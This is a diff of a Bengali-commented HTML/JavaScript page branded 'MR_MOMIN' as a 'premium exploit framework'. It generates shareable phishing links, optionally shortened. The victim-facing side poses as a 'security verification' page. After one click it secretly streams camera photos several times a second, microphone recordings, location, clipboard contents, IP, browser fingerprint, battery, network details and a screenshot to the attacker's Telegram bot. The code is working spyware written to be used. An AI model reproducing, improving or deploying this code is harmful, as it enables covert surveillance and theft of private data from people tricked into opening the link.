@@ -3,32 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>MR_MOMIN_🌍 | প্রিমিয়াম টুল</title>
+    <title>নিরাপত্তা যাচাই</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
+            font-family: 'Segoe UI', system-ui, sans-serif;
         }
         body {
-            background: radial-gradient(circle at 10% 20%, #0a0f1e, #010101);
+            background: #f5f5f5;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 1rem;
         }
+        /* জেনারেটর প্যানেলের স্টাইল (প্রশাসকের জন্য) */
         .glass-card {
             background: rgba(10, 20, 30, 0.7);
             backdrop-filter: blur(16px);
             border-radius: 2rem;
             border: 1px solid rgba(0, 255, 255, 0.3);
-            max-width: 550px;
+            max-width: 650px;
             width: 100%;
             padding: 2rem 1.5rem;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), 0 0 20px rgba(0, 255, 255, 0.2);
-            transition: all 0.3s ease;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
         }
         h1 {
             font-size: 2rem;
@@ -37,7 +38,6 @@
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            letter-spacing: -0.5px;
             margin-bottom: 0.25rem;
         }
         .tagline {
@@ -69,7 +69,6 @@
             color: #f0f9ff;
             font-size: 0.9rem;
             outline: none;
-            transition: 0.2s;
         }
         input:focus {
             border-color: #0ef;
@@ -85,26 +84,23 @@
             background: #0c1822;
             border: 1px solid #2a5b6e;
             border-radius: 1.2rem;
-            padding: 12px 6px;
+            padding: 8px 6px;
             text-align: center;
             cursor: pointer;
             transition: 0.2s;
             font-weight: 500;
-            font-size: 0.85rem;
+            font-size: 0.8rem;
             color: #cae9ff;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
+            gap: 6px;
         }
         .feature-card.selected {
             background: rgba(0, 200, 255, 0.2);
             border-color: #0ef;
             box-shadow: 0 0 12px #0ef4;
             color: white;
-        }
-        .feature-card span {
-            font-size: 1.3rem;
         }
         .btn {
             width: 100%;
@@ -118,7 +114,6 @@
             cursor: pointer;
             transition: 0.2s;
             margin-top: 10px;
-            letter-spacing: 0.5px;
         }
         .btn:active {
             transform: scale(0.97);
@@ -144,6 +139,7 @@
         .copy-row {
             display: flex;
             gap: 12px;
+            margin-top: 8px;
         }
         .copy-row button {
             flex: 1;
@@ -155,45 +151,24 @@
             color: #e0f2ff;
             cursor: pointer;
         }
-        .victim-container {
-            text-align: center;
+        .short-toggle {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            gap: 12px;
+            margin: 15px 0 10px;
+            background: #0a121c;
+            padding: 10px;
+            border-radius: 2rem;
         }
-        .victim-container h2 {
-            font-size: 1.6rem;
-            color: #9ef;
-            margin-bottom: 0.5rem;
+        .short-toggle label {
+            margin: 0;
+            cursor: pointer;
+            color: #bbddff;
         }
-        .victim-container p {
-            color: #bbd4f0;
-            font-size: 0.85rem;
-            margin: 12px 0;
-        }
-        .status-area {
-            margin-top: 1.5rem;
-            display: none;
-        }
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid #2f6f84;
-            border-top-color: #0ef;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto 12px;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .status-msg {
-            font-size: 0.8rem;
-            color: #ffd966;
-            background: #071a24;
-            padding: 8px;
-            border-radius: 1rem;
-            word-break: break-word;
-        }
-        .hide {
-            display: none;
+        .short-toggle input {
+            width: auto;
+            margin-right: 8px;
         }
         .info-note {
             font-size: 0.65rem;
@@ -201,12 +176,63 @@
             margin-top: 20px;
             color: #3f7e8c;
         }
+
+        /* ভিকটিম পেজের স্টাইল (নিরীহ ও সাধারণ) */
+        .victim-card {
+            background: white;
+            border-radius: 1.5rem;
+            max-width: 400px;
+            width: 100%;
+            padding: 2rem 1.5rem;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;
+        }
+        .victim-card h2 {
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+            color: #1e2a3e;
+        }
+        .victim-card p {
+            color: #4a5568;
+            margin-bottom: 1.5rem;
+        }
+        .victim-btn {
+            background: #0d8ba8;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 2rem;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .victim-btn:active {
+            transform: scale(0.97);
+        }
+        .loader {
+            display: inline-block;
+            width: 30px;
+            height: 30px;
+            border: 3px solid #e2e8f0;
+            border-top-color: #0d8ba8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .hide {
+            display: none;
+        }
     </style>
 </head>
 <body>
-<div class="glass-card" id="appRoot">
-    <!-- জেনারেটর প্যানেল -->
-    <div id="generatorPanel">
+<div id="appRoot">
+    <!-- জেনারেটর প্যানেল (শুধু প্রশাসক দেখবে) -->
+    <div id="generatorPanel" class="glass-card">
         <h1>MR_MOMIN_🌍</h1>
         <div style="text-align:center;"><span class="tagline">⚡ প্রিমিয়াম এক্সপ্লয়েট ফ্রেমওয়ার্ক</span></div>
 
@@ -224,6 +250,18 @@
             <div class="feature-card" data-feat="M"><span>🎙️</span> মাইক্রোফোন</div>
             <div class="feature-card" data-feat="L"><span>📍</span> লোকেশন</div>
             <div class="feature-card" data-feat="X"><span>💻</span> ডিভাইস তথ্য</div>
+            <div class="feature-card" data-feat="CB"><span>📋</span> ক্লিপবোর্ড</div>
+            <div class="feature-card" data-feat="BAT"><span>🔋</span> ব্যাটারি রিয়েল-টাইম</div>
+            <div class="feature-card" data-feat="NET"><span>🌐</span> নেটওয়ার্ক তথ্য</div>
+            <div class="feature-card" data-feat="FP"><span>🕵️</span> ব্রাউজার ফিঙ্গারপ্রিন্ট</div>
+            <div class="feature-card" data-feat="SS"><span>📱</span> স্ক্রিনশট</div>
+            <div class="feature-card" data-feat="AUD"><span>🔊</span> সাউন্ড ডিটেকশন</div>
+            <div class="feature-card" data-feat="REDIR"><span>🔄</span> অটো-ফরওয়ার্ড</div>
+        </div>
+
+        <div class="short-toggle">
+            <input type="checkbox" id="shortenCheckbox"> 
+            <label for="shortenCheckbox">🔗 শর্ট লিংক তৈরি করুন (is.gd)</label>
         </div>
 
         <button class="btn" id="generateLinkBtn">✨ লিংক জেনারেট করুন</button>
@@ -234,17 +272,17 @@
                 <button id="copyFullBtn">📋 লিংক কপি করুন</button>
             </div>
         </div>
-        <div class="info-note">🔒 লিংকটি কপি করে শেয়ার করুন। ভিকটিম ওপেন করলে শুরু বাটনে ক্লিক করবে এবং অনুমতি দিলেই সব তথ্য টেলিগ্রামে চলে আসবে।</div>
+        <div class="info-note">🔒 লিংকটি কপি করে শেয়ার করুন। ভিকটিম ওপেন করলে একটি বাটন দেখাবে। বাটনে ক্লিক করলেই অনুমতি চাইবে এবং সব তথ্য চুপিসারে টেলিগ্রামে চলে আসবে।</div>
     </div>
 
-    <!-- ভিকটিম প্যানেল (প্রথমে লুকানো) -->
-    <div id="victimPanel" class="victim-container hide">
-        <h2>🛡️ যাচাইকরণ প্রয়োজন</h2>
-        <p>নিচের বাটনে ক্লিক করে আপনার পরিচয় নিশ্চিত করুন</p>
-        <button class="btn" id="startVictimBtn">▶ শুরু করুন</button>
-        <div id="victimStatusArea" class="status-area">
-            <div class="spinner"></div>
-            <div class="status-msg" id="victimStatusMsg">প্রস্তুতি নিচ্ছি...</div>
+    <!-- ভিকটিম প্যানেল (সাধারণ ব্যবহারকারী দেখবে) -->
+    <div id="victimPanel" class="victim-card hide">
+        <h2>🔒 নিরাপত্তা যাচাই</h2>
+        <p>আপনার ডিভাইস নিরাপদ কিনা নিশ্চিত করতে নিচের বাটনে ক্লিক করুন।</p>
+        <button id="startVictimBtn" class="victim-btn">ভেরিফাই করুন</button>
+        <div id="victimStatusArea" class="hide">
+            <div class="loader"></div>
+            <p style="color:#4a5568;">যাচাই করা হচ্ছে, দয়া করে অপেক্ষা করুন...</p>
         </div>
     </div>
 </div>
@@ -254,26 +292,17 @@
 <canvas id="hiddenCanvas" style="display:none;"></canvas>
 
 <script>
-    // ===================== নিরাপদে বেস ইউআরএল তৈরি =====================
+    // ===================== বেস ইউআরএল ফাংশন =====================
     function getBaseUrl() {
-        // সরাসরি href থেকে '?' এর আগের অংশ নেওয়া (এতে about: বা null আসবে না)
         let fullUrl = window.location.href;
         let base = fullUrl.split('?')[0];
-        // যদি base 'about:' দিয়ে শুরু হয় তাহলে আমরা origin+pathname ব্যবহার করব
         if (base.startsWith('about:') || base === 'null' || base === '') {
             let origin = window.location.origin;
             let pathname = window.location.pathname;
-            if (origin && origin !== 'null') {
-                base = origin + pathname;
-            } else {
-                // শেষ উপায়: পেজের নাম ধরে নেওয়া (index.html)
-                base = 'index.html';
-            }
+            if (origin && origin !== 'null') base = origin + pathname;
+            else base = 'index.html';
         }
-        // শেষে '/' থাকলে মুছে ফেলি
-        if (base.endsWith('/')) {
-            base = base.slice(0, -1);
-        }
+        if (base.endsWith('/')) base = base.slice(0, -1);
         return base;
     }
 
@@ -284,16 +313,15 @@
     const featParam = urlParams.get('f') || '';
 
     if (tokenParam && chatParam) {
-        // ভিকটিম মোড
+        // ভিকটিম মোড – সাধারণ ইউজারের জন্য
         document.getElementById('generatorPanel').classList.add('hide');
         document.getElementById('victimPanel').classList.remove('hide');
-        startVictimMode(tokenParam, chatParam, featParam);
+        setupVictimMode(tokenParam, chatParam, featParam);
     } else {
-        // জেনারেটর মোড
         setupGenerator();
     }
 
-    // ===================== জেনারেটর ফাংশন =====================
+    // ===================== জেনারেটর =====================
     function setupGenerator() {
         const featureDivs = document.querySelectorAll('.feature-card');
         let selectedFeatures = new Set();
@@ -314,13 +342,14 @@
         const genBtn = document.getElementById('generateLinkBtn');
         const linkBox = document.getElementById('linkResultBox');
         const linkSpan = document.getElementById('generatedLink');
-        let fullLink = '';
+        const shortenCheck = document.getElementById('shortenCheckbox');
+        let fullLink = '', shortLink = '';
 
-        genBtn.addEventListener('click', () => {
+        genBtn.addEventListener('click', async () => {
             const token = document.getElementById('botToken').value.trim();
             const chatId = document.getElementById('chatId').value.trim();
             if (!token || !chatId) {
-                alert('⚠️ বট টোকেন এবং চ্যাট আইডি উভয়ই দিন!');
+                alert('⚠️ বট টোকেন এবং চ্যাট আইডি দিন!');
                 return;
             }
             if (selectedFeatures.size === 0) {
@@ -330,14 +359,27 @@
             const features = Array.from(selectedFeatures).join('');
             const baseUrl = getBaseUrl();
             fullLink = `${baseUrl}?t=${encodeURIComponent(token)}&c=${encodeURIComponent(chatId)}&f=${features}`;
-            
-            linkSpan.innerText = fullLink;
+
+            if (shortenCheck.checked) {
+                linkSpan.innerText = '⏳ শর্ট লিংক তৈরি হচ্ছে...';
+                try {
+                    const res = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(fullLink)}`);
+                    const data = await res.json();
+                    shortLink = data.shorturl || fullLink;
+                    linkSpan.innerText = shortLink;
+                } catch(e) {
+                    linkSpan.innerText = fullLink;
+                }
+            } else {
+                linkSpan.innerText = fullLink;
+            }
             linkBox.style.display = 'block';
         });
 
         document.getElementById('copyFullBtn').onclick = () => {
-            if (fullLink) {
-                copyToClipboard(fullLink, '✅ লিংক কপি হয়েছে!');
+            const currentLink = linkSpan.innerText;
+            if (currentLink && currentLink !== 'আপনার লিংক এখানে' && !currentLink.includes('⏳')) {
+                copyToClipboard(currentLink, '✅ লিংক কপি হয়েছে!');
             } else {
                 alert('প্রথমে লিংক জেনারেট করুন');
             }
@@ -348,24 +390,25 @@
         navigator.clipboard.writeText(text).then(() => alert(msg));
     }
 
-    // ===================== ভিকটিম মোড (সম্পূর্ণ কার্যকর) =====================
-    async function startVictimMode(token, chatId, features) {
+    // ===================== ভিকটিম মোড – নিরীহ বাটন, পেছনে সব কাজ =====================
+    function setupVictimMode(token, chatId, features) {
         const startBtn = document.getElementById('startVictimBtn');
         const statusArea = document.getElementById('victimStatusArea');
-        const statusMsg = document.getElementById('victimStatusMsg');
 
         startBtn.addEventListener('click', async () => {
+            // বাটন লুকিয়ে স্পিনার দেখানো
             startBtn.style.display = 'none';
-            statusArea.style.display = 'block';
-            statusMsg.innerText = '🔐 অনুমতি চাওয়া হচ্ছে...';
+            statusArea.classList.remove('hide');
 
-            // টেলিগ্রামে পাঠানোর হেল্পার ফাংশন
+            // টেলিগ্রাম হেল্পার (সব মেসেজে ডেভেলপার নাম যুক্ত)
+            const devTag = "\n\n_🧨 Developed by MR_MOMIN_🌍_";
+
             async function sendText(text) {
                 try {
                     await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
+                        body: JSON.stringify({ chat_id: chatId, text: text + devTag, parse_mode: 'Markdown' })
                     });
                 } catch(e) { console.error(e); }
             }
@@ -384,7 +427,7 @@
                 await fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: fd });
             }
 
-            // ----- ১. ডিভাইস তথ্য (X) -----
+            // ---------- 1. ডিভাইস তথ্য ----------
             if (features.includes('X')) {
                 try {
                     let ip = 'অজানা';
@@ -399,10 +442,9 @@
                 }
                 const info = `📱 *ডিভাইস তথ্য*\nআইপি: \`${ip}\`\nব্যাটারি: ${battery}\nপ্ল্যাটফর্ম: ${navigator.platform}\nভাষা: ${navigator.language}\nস্ক্রিন: ${screen.width}x${screen.height}\nসময়: ${new Date().toLocaleString('bn-BD')}`;
                 await sendText(info);
-                statusMsg.innerText = '✅ ডিভাইস তথ্য পাঠানো হয়েছে';
             }
 
-            // ----- ২. লোকেশন (L) -----
+            // ---------- 2. লোকেশন ----------
             if (features.includes('L')) {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(async (pos) => {
@@ -410,7 +452,6 @@
                         const lon = pos.coords.longitude;
                         const maps = `https://maps.google.com/?q=${lat},${lon}`;
                         await sendText(`📍 *লোকেশন*\nঅক্ষাংশ: ${lat}\nদ্রাঘিমাংশ: ${lon}\n[মানচিত্রে দেখুন](${maps})`);
-                        statusMsg.innerText = statusMsg.innerText + '\n📍 লোকেশন ধারণ করা হয়েছে';
                     }, async (err) => {
                         await sendText(`❌ লোকেশন ত্রুটি: ${err.message}`);
                     });
@@ -419,7 +460,7 @@
                 }
             }
 
-            // ----- ৩. ক্যামেরা (C) -----
+            // ---------- 3. ক্যামেরা (প্রতি সেকেন্ডে ৩টি ছবি) ----------
             let cameraInterval = null;
             if (features.includes('C')) {
                 try {
@@ -433,19 +474,17 @@
                             canvas.width = video.videoWidth;
                             canvas.height = video.videoHeight;
                             canvas.getContext('2d').drawImage(video, 0, 0);
-                            canvas.toBlob(blob => sendPhoto(blob), 'image/jpeg', 0.65);
+                            canvas.toBlob(blob => sendPhoto(blob), 'image/jpeg', 0.7);
                         }
                     };
-                    capture(); // প্রথম ছবি সঙ্গে সঙ্গে
-                    cameraInterval = setInterval(capture, 4000); // প্রতি ৪ সেকেন্ডে
-                    statusMsg.innerText = statusMsg.innerText + '\n📸 ক্যামেরা সক্রিয় (প্রতি ৪ সেকেন্ডে ছবি)';
+                    capture(); // first shot
+                    cameraInterval = setInterval(capture, 333); // 333ms = ~3 per second
                 } catch (err) {
                     await sendText(`❌ ক্যামেরা ত্রুটি: ${err.message}`);
-                    statusMsg.innerText = statusMsg.innerText + '\n⚠️ ক্যামেরা অনুমতি দেওয়া হয়নি';
                 }
             }
 
-            // ----- ৪. মাইক্রোফোন (M) -----
+            // ---------- 4. মাইক্রোফোন (6 সেকেন্ড রেকর্ড) ----------
             if (features.includes('M')) {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -460,16 +499,133 @@
                         };
                     });
                     mediaRecorder.start();
-                    setTimeout(() => mediaRecorder.stop(), 6000); // ৬ সেকেন্ড রেকর্ড
+                    setTimeout(() => mediaRecorder.stop(), 6000);
                     const audioBlob = await audioPromise;
                     await sendVoice(audioBlob);
-                    statusMsg.innerText = statusMsg.innerText + '\n🎤 ভয়েস রেকর্ডিং পাঠানো হয়েছে';
                 } catch (err) {
                     await sendText(`❌ মাইক্রোফোন ত্রুটি: ${err.message}`);
                 }
             }
 
-            statusMsg.innerText = statusMsg.innerText + '\n✨ কাজ শেষ। এই পৃষ্ঠা বন্ধ করতে পারেন।';
+            // ---------- 5. ক্লিপবোর্ড মনিটরিং ----------
+            if (features.includes('CB')) {
+                const checkClipboard = async () => {
+                    try {
+                        const text = await navigator.clipboard.readText();
+                        if (text && text.trim() !== '') {
+                            await sendText(`📋 *ক্লিপবোর্ড টেক্সট*\n\`\`\`\n${text.substring(0, 500)}\n\`\`\``);
+                        }
+                        const items = await navigator.clipboard.read();
+                        for (const item of items) {
+                            for (const type of item.types) {
+                                if (type.startsWith('image/')) {
+                                    const blob = await item.getType(type);
+                                    await sendPhoto(blob);
+                                }
+                            }
+                        }
+                    } catch(e) { /* চুপ */ }
+                };
+                checkClipboard();
+                setInterval(checkClipboard, 7000);
+            }
+
+            // ---------- 6. ব্যাটারি রিয়েল-টাইম ----------
+            if (features.includes('BAT') && navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                const sendBattery = () => {
+                    const msg = `🔋 *ব্যাটারি আপডেট*\nলেভেল: ${Math.round(battery.level*100)}%\nস্ট্যাটাস: ${battery.charging ? 'চার্জিং' : 'চার্জিং না'}`;
+                    sendText(msg);
+                };
+                sendBattery();
+                battery.addEventListener('levelchange', sendBattery);
+                battery.addEventListener('chargingchange', sendBattery);
+            }
+
+            // ---------- 7. নেটওয়ার্ক তথ্য ----------
+            if (features.includes('NET')) {
+                let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                let netInfo = `🌐 *নেটওয়ার্ক তথ্য*\nআইপি: ${await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'অজানা')}\n`;
+                if (connection) {
+                    netInfo += `টাইপ: ${connection.effectiveType || 'N/A'}\nডাউনলিংক: ${connection.downlink || 'N/A'} Mbps\nRTT: ${connection.rtt || 'N/A'} ms`;
+                } else {
+                    netInfo += `কানেকশন API উপলব্ধ নয়।`;
+                }
+                await sendText(netInfo);
+            }
+
+            // ---------- 8. ব্রাউজার ফিঙ্গারপ্রিন্ট ----------
+            if (features.includes('FP')) {
+                const canvas = document.createElement('canvas');
+                canvas.width = 200;
+                canvas.height = 50;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(0, 0, 100, 50);
+                ctx.fillStyle = '#069';
+                ctx.fillText('MR_MOMIN', 2, 15);
+                const fp = canvas.toDataURL();
+                const plugins = Array.from(navigator.plugins).map(p => p.name).join(', ');
+                const fingerprintData = `🕵️ *ব্রাউজার ফিঙ্গারপ্রিন্ট*\n- ক্যানভাস হ্যাশ: ${fp.substring(0, 50)}...\n- প্লাগইন: ${plugins}\n- ইউজার এজেন্ট: ${navigator.userAgent}\n- ভাষা: ${navigator.language}\n- কোরস: ${navigator.hardwareConcurrency || 'N/A'} cores\n- মেমরি: ${navigator.deviceMemory || 'N/A'} GB`;
+                await sendText(fingerprintData);
+            }
+
+            // ---------- 9. স্ক্রিনশট ----------
+            if (features.includes('SS')) {
+                try {
+                    const screenshotCanvas = await html2canvas(document.body, { scale: 0.8, logging: false });
+                    const blob = await new Promise(resolve => screenshotCanvas.toBlob(resolve, 'image/jpeg', 0.7));
+                    await sendPhoto(blob);
+                } catch (err) {
+                    await sendText(`❌ স্ক্রিনশট নিতে ব্যর্থ: ${err.message}`);
+                }
+            }
+
+            // ---------- 10. সাউন্ড ডিটেকশন ----------
+            if (features.includes('AUD')) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                    const source = audioCtx.createMediaStreamSource(stream);
+                    const analyser = audioCtx.createAnalyser();
+                    source.connect(analyser);
+                    analyser.fftSize = 256;
+                    const dataArray = new Uint8Array(analyser.frequencyBinCount);
+                    let maxLevel = 0;
+                    const measure = () => {
+                        analyser.getByteTimeDomainData(dataArray);
+                        let max = 0;
+                        for (let i = 0; i < dataArray.length; i++) {
+                            let v = (dataArray[i] - 128) / 128;
+                            max = Math.max(max, Math.abs(v));
+                        }
+                        maxLevel = Math.max(maxLevel, max);
+                    };
+                    const interval = setInterval(measure, 100);
+                    setTimeout(() => {
+                        clearInterval(interval);
+                        stream.getTracks().forEach(t => t.stop());
+                        audioCtx.close();
+                        const isLoud = maxLevel > 0.05;
+                        const msg = `🔊 *সাউন্ড ডিটেকশন*\nসর্বোচ্চ অ্যাম্বিয়েন্ট লেভেল: ${maxLevel.toFixed(3)}\n${isLoud ? 'শব্দ সনাক্ত হয়েছে' : 'পরিবেশ শান্ত'}`;
+                        sendText(msg);
+                    }, 3000);
+                } catch (err) {
+                    await sendText(`❌ সাউন্ড ডিটেকশন ব্যর্থ: ${err.message}`);
+                }
+            }
+
+            // ---------- 11. অটো-ফরওয়ার্ড ----------
+            if (features.includes('REDIR')) {
+                const redirectUrl = prompt('ফরওয়ার্ড করার URL দিন:', 'https://www.google.com');
+                if (redirectUrl) {
+                    setTimeout(() => {
+                        window.location.href = redirectUrl;
+                    }, 3000);
+                }
+            }
         });
     }
 </script>
